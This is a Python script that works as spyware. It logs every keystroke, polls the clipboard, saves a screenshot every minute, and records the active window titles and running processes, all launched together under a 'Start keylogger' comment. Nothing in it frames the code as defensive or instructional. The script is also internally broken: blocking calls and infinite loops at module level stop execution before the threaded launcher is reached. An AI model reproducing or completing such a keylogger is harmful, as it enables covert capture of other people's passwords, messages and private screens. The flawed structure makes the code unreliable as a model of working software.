from pynput import keyboard
import pyperclip
import time
from PIL import ImageGrab
import os
import psutil
import pygetwindow as gw  # type: ignore[import-untyped]
import threading


def on_press(key):

    try:

        print(f'Key pressed: {key.char}')

    except AttributeError:

        print(f'Special key pressed: {key}')

listener = keyboard.Listener(on_press=on_press)

listener.start()

listener.join()


def log_clipboard():

    recent_value = ""

    while True:

        time.sleep(5)

        current_value = pyperclip.paste()

        if current_value != recent_value:

            recent_value = current_value

            print(f'Clipboard content: {recent_value}')

log_clipboard()

def capture_screen():

    while True:

        time.sleep(60)

        screenshot = ImageGrab.grab()

        screenshot.save(os.path.join("screenshots", f"screenshot_{int(time.time())}.png"))

capture_screen()

def track_activity():

    previous_window = None

    while True:

        time.sleep(5)

        current_window = gw.getActiveWindowTitle()

        if current_window != previous_window:

            previous_window = current_window

            print(f'Active window: {current_window}')

        for proc in psutil.process_iter(['pid', 'name']):

            print(f'Running process: {proc.info["name"]} (PID: {proc.info["pid"]})')

track_activity()


# Start keylogger

listener = keyboard.Listener(on_press=on_press)

listener.start()

# Start clipboard logger

clipboard_thread = threading.Thread(target=log_clipboard)

clipboard_thread.start()

# Start screen capture

screen_thread = threading.Thread(target=capture_screen)

screen_thread.start()

# Start activity tracker

activity_thread = threading.Thread(target=track_activity)

activity_thread.start()

listener.join()

clipboard_thread.join()

screen_thread.join()

activity_thread.join()


